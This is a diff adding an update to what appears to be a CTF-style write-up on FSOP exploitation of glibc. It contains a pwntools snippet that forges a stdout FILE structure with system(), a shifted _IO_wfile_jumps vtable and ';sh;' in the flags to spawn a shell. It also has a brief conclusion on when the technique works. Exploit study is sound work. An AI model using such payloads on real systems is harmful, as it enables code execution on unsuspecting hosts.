@@ -331,6 +331,17 @@ However, when I do this exploit on `aarch64`, I have to set the flag to `0xfbad2
 This path is easier to understand, isn't it :D.
 ## TO DO
 * Merge 2 buffers of `wide_data` path into 1 buffer.
+**Updated**
+```python 
+filestr.unknown2 = p64(0)*2 + p64(libc.sym["system"]) + p64(0)*3 + p64(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p64(libc.sym["_IO_2_1_stdout_"] +0x50)
+filestr._wide_data = libc.sym["_IO_2_1_stdout_"]
+filestr.flags = 0xfbad20b1 + (u32(b';sh;') << 32)
+filestr._lock = libc.address + 0x21a200
+chall.sendlineafter(b'> ',hex(libc.sym["_IO_2_1_stdout_"]))
+chall.send(bytes(filestr))
+chall.interactive()
+```
+Using the same path of the aforementioned exploit targeting `wide_data`, this exploit merged 2 buffer into 1 buffer 0xe8 in length.
 ## Conclusion
 After some trials and errors, I found code execution on FSOP is very strong on specific scenarios: you only have 1 big arbitrary write and only leaked libc address. For smaller arbitrary write buffer, you have to be more careful, and it may not worth it. You can overwrite stdin to read more buffer to combat small arbitrary buffer. It's also not very useful when it comes to bypass seccomps. In that case, leaking environ into ROPchain is more reliable.
 
